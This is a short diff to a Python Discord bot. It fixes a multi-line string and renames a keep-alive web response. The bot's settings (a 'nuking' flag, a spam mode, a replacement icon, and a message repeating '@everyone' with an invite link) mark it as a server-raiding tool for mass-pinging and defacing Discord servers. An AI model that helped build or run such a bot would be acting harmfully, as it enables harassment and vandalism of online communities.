@@ -14,7 +14,7 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 bot.nuking = False
 SPAM_MODE = "both"
 NEW_ICON_URL = "https://media.discordapp.net/attachments/1332244814892109885/1376589078753185862/static.png?ex=6835dffc&is=68348e7c&hm=f40c2f61a30d171b1c1a997c562f39c491a6ef09ec88b25b14a59c0c6478a6c3&=&format=webp&quality=lossless&width=320&height=320"
-CUSTOM_SPAM_TEXT = "@everyone https://discord.gg/66CRXWrw4
+CUSTOM_SPAM_TEXT = """@everyone https://discord.gg/66CRXWrw4
 @everyone https://discord.gg/66CRXWrw4
 @everyone https://discord.gg/66CRXWrw4
 @everyone https://discord.gg/66CRXWrw4
@@ -42,7 +42,7 @@ CUSTOM_SPAM_TEXT = "@everyone https://discord.gg/66CRXWrw4
 @everyone https://discord.gg/66CRXWrw4
 @everyone https://discord.gg/66CRXWrw4
 @everyone https://discord.gg/66CRXWrw4
-@everyone https://discord.gg/66CRXWrw4"
+@everyone https://discord.gg/66CRXWrw4"""
 CUSTOM_ICON_URL = None
 CUSTOM_SERVER_NAME = None
 CUSTOM_CHANNEL_SUFFIX = None
@@ -261,7 +261,7 @@ async def help(ctx):
         pass
 
 async def handle_web(request):
-    return web.Response(text="PMT ON")
+    return web.Response(text="Bot is running")
 
 async def start_web_server():
     app = web.Application()
